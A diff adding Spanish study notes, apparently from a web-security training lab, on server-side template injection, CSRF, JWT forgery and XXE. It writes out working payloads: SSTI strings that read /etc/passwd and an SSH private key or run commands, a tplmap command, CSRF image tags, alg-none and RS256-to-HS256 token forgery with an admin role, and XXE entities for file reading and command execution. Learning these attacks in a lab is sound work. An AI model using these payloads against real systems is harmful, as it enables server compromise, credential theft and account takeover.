@@ -1,0 +1,166 @@
+Server Side Template Injection
+------------------------------
+Un motor de plantillas permite a los desarrolladores utilizar páginas HTML estáticas con elementos dinámicos. Tomemos, por ejemplo, una página estática profile.html, un motor de plantilla permitiría a un desarrollador establecer un parámetro de nombre de usuario, que siempre se establecería en el nombre de usuario del usuario actual.
+
+La inyección de plantillas del lado del servidor es cuando un usuario puede pasar un parámetro que puede controlar el motor de plantillas que se ejecuta en el servidor.
+
+Por ejemplo, toma el código
+
+template = """
+
+<!DOCTYPE html><html><body>\
+    <form action"/" method="post">\
+        Fist name:<br>\
+        <input type="text" name="name" value="">\
+        <input type="submit" value="Submit">\
+    </form><h2>Hello %s! </h2></body></html>""" % user_input
+return render_template_string(template)
+
+Esto introduce una vulnerabilidad, ya que permite a un pirata informático inyectar código de plantilla en el sitio web. 
+Los efectos de esto pueden ser devastadores, desde XSS hasta RCE.
+
+Nota: Los diferentes motores de plantilla tienen diferentes cargas útiles de inyección, sin embargo, normalmente puede probar SSTI usando {{2 + 2}} como prueba.
+
+¡Auge! Eso es inyección de plantilla. Podemos usar el maravilloso repositorio  PayloadsAllTheThings , para encontrar algunas cargas útiles para el motor de plantillas de flask. El repositorio dice que podemos usar el código 
+
+{{ ''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}} para leer archivos en el servidor. Efectivamente, todo lo que hace la carga útil es cargar el objeto de archivo en Python, 
+desde allí podemos usar operaciones de archivo básicas. Intentemos leer / etc / passwd usando este método.
+
+¡Tenemos LFI! Desafortunadamente (o afortunadamente, dependiendo de cómo lo veas), ese no es el alcance de esta vulnerabilidad. El mismo repositorio también incluye una carga útil para la ejecución remota de código. 
+
+Podemos usar el código  {{config.__class__.__init__.__globals__['os'].popen(<command>).read()}} para ejecutar comandos en el  servidor. 
+Todo lo que hace la carga útil es importar el módulo del sistema operativo y ejecutar un comando utilizando el método popen.
+A partir de ahí, un atacante ya ha ganado, puede usar esta capacidad para obtener un caparazón en el servidor.
+
+¿Cómo podría un hacker (tú :)) sacar / etc / passwd en el servidor (usando cat con la carga útil rce)
+- {{config.__class__.__init__.__globals__['os'].popen(cat /etc/passwd).read()}}
+¿Qué hay de leer el contenido de la clave ssh privada de la prueba del usuario? (Use el archivo de lectura, no el rce)
+- {{ ''.__class__.__mro__[2].__subclasses__()[40]()(/home/test/.ssh/id_rsa).read()}}
+
+---------------------------------------------------------------------------------------
+
+Afortunadamente, no tenemos que buscar cargas útiles para ver cómo podemos usar SSTI a nuestro favor, ¡porque hay una herramienta conocida como Tplmap que lo hace por nosotros! La herramienta se puede encontrar aquí . 
+
+Nota: use python2 para instalar los requisitos. python2 -m pip
+
+La sintaxis básica de tplmap es diferente dependiendo de si está usando get o post
+
+OBTENER	tplmap -u <url> /? <vulnparam>
+CORREO	tplmap -u <url> -d '<vulnparam>'
+Dado que nuestro código opera a través de un formulario, se utilizará la sintaxis de publicación.
+
+¿Cómo puedo sacar / etc / passwd usando tplmap en el  combo ip: port 10.10.10.10:5000, con el parámetro vulnerable "noot"?
+- tplmap.py -u http://10.10.10.10:5000/ -d /'noot' --os-cmd 'cat /etc/passwd'
+
+----------------------------------------------------------------------------------------
+
+Que es CSRF?
+------------
+
+Cross Site Request Forgery, conocida como CSRF, se produce cuando un usuario visita una página de un sitio que realiza una acción en un sitio diferente. 
+Por ejemplo, digamos que un usuario hace clic en un enlace a un sitio web creado por un pirata informático, en el sitio web habría una etiqueta html como <img src = "https://vulnerable-website.com/email/change?email=pwned @ evil-user.net "> que cambiaría el correo electrónico de la cuenta en el sitio web vulnerable a" pwned@evil-user.net ". 
+CSRF funciona porque es la víctima quien realiza la solicitud, no el sitio, por lo que todo lo que ve el sitio es un usuario normal que realiza una solicitud normal.
+
+Esto abre la puerta a que la cuenta del usuario se vea comprometida por completo mediante el uso de un restablecimiento de contraseña, por ejemplo. 
+No se puede exagerar la gravedad de esto, ya que permite que un atacante obtenga potencialmente información personal sobre un usuario, como los detalles de la tarjeta de crédito en un caso extremo.
+
+Explotaicon manual de CSRF
+--------------------------
+Esto se ve bien, los parámetros que podemos personalizar y una cookie de sesión que se configura automáticamente. Todo parece vulnerable a CSRF. Intentemos crear un sitio vulnerable. Poniendo  <img src = "http: // localhost: 3000 / transfer? To = alice & amount = 100">
+
+Explotaicon atuomatica
+----------------------
+Una vez más, hay un buen escáner automatizado, que prueba si un sitio es vulnerable a CSRF. esta herramienta se conoce como xsrfprobe y se puede instalar a través de pip usando pip3 install xsrfprobe. Esto solo funcionará usando Python 3 (quiero decir, vamos, es 2020, deberías usar Python 3 de todos modos).
+La sintaxis del comando es  xsrfprobe -u <url>/<endpoint>. Ejecutemos esto contra nuestro sitio vulnerable.
+
+--------------------------------------------------------------------------------------------
+
+Que es JWT?
+-----------
+
+Json Web Token es un caso bastante interesante, ya que no es una vulnerabilidad en sí misma. 
+De hecho, es un método de autenticación bastante popular y, si se hace correctamente, muy seguro. 
+La estructura básica de un JWT es la siguiente: "header.payload.secret", el secreto solo lo conoce el servidor y se utiliza para asegurarse de que los datos no se hayan modificado durante el proceso. 
+Entonces todo está codificado en base64. por lo que un ejemplo de token JWT se vería así
+
+"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+
+Lo que significa que si somos capaces de controlar el secreto, podemos controlar los datos de forma eficaz. 
+Para poder hacer esto tenemos que entender cómo se calcula el secreto. Esto requiere conocer la estructura del encabezado, un encabezado JWT típico se ve así  {"typ": "JWT", "alg": "RS256"}.  
+Estamos interesados ​​en el campo alg. RS256 usa una clave RSA privada que solo está disponible para el servidor, por lo que no es vulnerable. 
+Sin embargo, podemos cambiar ese campo a HS256, este se calcula utilizando la clave pública del servidor , a la que en determinadas circunstancias también podemos tener acceso.
+
+Desafortunadamente, parece que el algoritmo es RS256, que no tiene vulnerabilidades. 
+Sin embargo, afortunadamente para nosotros, este servidor deja su clave pública por ahí, lo que significa que podemos cambiar el algoritmo y firmar un nuevo secreto. 
+El primer paso es cambiar el algoritmo en el encabezado a HS256 y luego volver a codificarlo en base64. 
+Nuestro nuevo JWT es eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0IiwiaWF0IjoxNTg1MzIzNzg0LCJleHAiOjE1ODUzMjM5MDQsImRhdGEiOnsiaGVsbG8iOiJ3b3JsZCJ9fQ.FXj9F1jIXlhMyoQAo5-XPOiZeP4Ltw5XXZGqgX49tKkYUOeirOXUDgWL4bqP9nRXIODqOByqS_9O11nQN5bC_LTpfBWG2WZXg0tKIDAbKTxVkrytXBmOkP1qRK_Apv-CQs-mouuS1we8SHYShW_r4DEj0qAF3dsWVVzbRWNMH4Oc_odHNogv00dVlABcxMyXFpNJbeRS6-GCS-A4SFM32gMv_mkfkXrQPdejKDU_sKZrD5VVAmDlu0BainIvD28l8uV3OCc37shtPW0TKoIwUXmGsFYouKqk-h0dz4aTBLKJk7L64XdrA7ts1oOtzk8KqV6gnqXDXUNkzDX3qd9JKA
+
+El siguiente paso es convertir la clave pública a hexadecimal para que openssl la use.
+- cat a | xxd -p | tr -d "\\n"
+
+(Explicación: a es el archivo con la clave pública, xxd -pconvierte el contenido de un archivo a hexadecimal y trestá ahí para deshacerse de las líneas nuevas)
+El siguiente paso es usar openssl para firmar eso como una clave HS256 válida.
+- echo -n "<token>" | openssl dgst -sha256 -mac HMAC -macopt <hex>
+
+¡Todo va bien hasta ahora !. El paso final es decodificar esos datos hexadecimales en binarios y volver a codificarlos en base64; afortunadamente, Python nos lo hace realmente fácil.
+- python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binasscii.a2b_hex(<output hex)).replace('=','')\")"
+
+Ese es nuestro secreto final, ahora lo ponemos donde debería ir el secreto, y el servidor debería aceptarlo.
+
+Entonces nuestro JWT final seríaeyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.<payload>.<new secret>
+
+Además de la vulnerabilidad anterior, ciertas bibliotecas JWT tienen otra vulnerabilidad devastadora. En realidad, hay tres algoritmos posibles, dos de ellos RS256 y HS256 que ya hemos estudiado. Hay un tercer algoritmo, conocido como None. De acuerdo con el RFC oficial de JWT, el algoritmo None se usa cuando aún desea usar JWT, sin embargo, existe otra seguridad para evitar que las personas falsifiquen datos. 
+Desafortunadamente, ciertas bibliotecas JWT claramente no leyeron el RFC, lo que permite una vulnerabilidad en la que un atacante puede cambiar al algoritmo None, de la misma manera que uno cambia de RS256 a HS255, y hacer que el token sea completamente válido sin necesidad de calcular un secreto. 
+
+Ahora intentemos cambiar el campo alg a ninguno, deshacernos de la firma y cambiar el rol a admin. 
+Eso nos deja con este token final de jwt.
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNTg1MzQ1ODg0MjA0LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTg1MzQ1ODg0fQ.
+
+Lo interesante que todavía necesitamos es un segundo. para indicar que una firma estaría allí, aunque no ponemos nada después. 
+Intentemos colocar ese token en el lugar donde se supone que debe estar la cookie.
+
+No hay ninguna herramienta que pueda verificar la biblioteca, obtener el token y asegurarse de que sea vulnerable. Por lo tanto, tendrá que hacer esto manualmente. Sin embargo, el encabezado para cada JWT none vuln es el mismo, lo que puede ayudarte. Aquí está el encabezado
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
+Que decodifica a {"type": "JWT", "alg": "none"}
+
+-------------------------------------------------------------------------------------------------------
+Que es un XXE?
+--------------
+
+Algunas aplicaciones ocasionalmente le pedirán que publique un documento XML para realizar una acción. El manejo inadecuado de estos documentos XML puede conducir a lo que se conoce como inyección de entidad externa XML (XXE). 
+XXE es cuando un atacante puede usar la función ENTITY de XML para cargar recursos desde fuera del directorio del sitio web, por ejemplo, XXE permitiría que un ataque cargue el contenido de / etc / passwd.
+Dado que la aplicación no necesariamente tiene que devolver datos, es posible que no pueda obtener el contenido de la entidad externa; 
+sin embargo, eso no significa que todas las esperanzas estén perdidas. Si tiene mucha suerte, puede usar el módulo php esperan para obtener RCE de todos modos.
+
+Explotacion manual
+------------------
+
+Burp
+Ejecucion LFI:
+--------------
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<root>
+    <name>aa</name>
+    <tel>aa</tel>
+    <email>&xxe;</email>
+    <password>aa</password>
+</root>
+
+¡Tenemos XXE! Por lo general, este es el mejor de los casos, podemos obtener la salida de archivos en el sistema y, a partir de eso, podríamos enumerar más. 
+Sin embargo, existe la posibilidad de que podamos obtener RCE de XXE si el módulo php esperan está cargado. Intentemos hacer eso. 
+Todo lo que espera es un módulo php que le permite ejecutar comandos.
+
+Ejecucion remota:
+-----------------
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "expect://id" >]>
+<root>
+    <name>aa</name>
+    <tel>aa</tel>
+    <email>&xxe;</email>
+    <password>aa</password>
+</root>
